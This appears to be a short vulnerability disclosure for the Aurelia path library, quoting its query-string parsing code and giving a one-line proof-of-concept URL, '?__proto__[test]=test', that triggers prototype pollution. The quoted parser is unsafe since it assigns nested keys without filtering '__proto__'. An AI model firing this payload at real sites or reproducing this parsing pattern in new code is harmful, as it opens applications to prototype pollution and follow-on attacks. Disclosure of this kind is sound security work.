## Aurelia path

URL: https://github.com/aurelia/path

### Vulnerable code fragment

https://github.com/aurelia/path/blob/a9906488fff20ea44883974dd279477d9b3d9a7a/src/index.ts#L232-L276

```js
  let pairs = query.replace(/\+/g, ' ').split('&');
  for (let i = 0; i < pairs.length; i++) {
    let pair = pairs[i].split('=');
    let key = decodeURIComponent(pair[0]);
    if (!key) {
      continue;
    }
    //split object key into its parts
    let keys = key.split('][');
    let keysLastIndex = keys.length - 1;

    // If the first keys part contains [ and the last ends with ], then []
    // are correctly balanced, split key to parts
    //Else it's basic key
    if (/\[/.test(keys[0]) && /\]$/.test(keys[keysLastIndex])) {
      keys[keysLastIndex] = keys[keysLastIndex].replace(/\]$/, '');
      keys = keys.shift().split('[').concat(keys);
      keysLastIndex = keys.length - 1;
    } else {
      keysLastIndex = 0;
    }

    if (pair.length >= 2) {
      let value = pair[1] ? decodeURIComponent(pair[1]) : '';
      if (keysLastIndex) {
        parseComplexParam(queryParams, keys, value);
      } else {
        queryParams[key] = processScalarParam(queryParams[key], value);
      }
    } else {
      queryParams[key] = true;
    }
```

### PoC

```
?__proto__[test]=test
```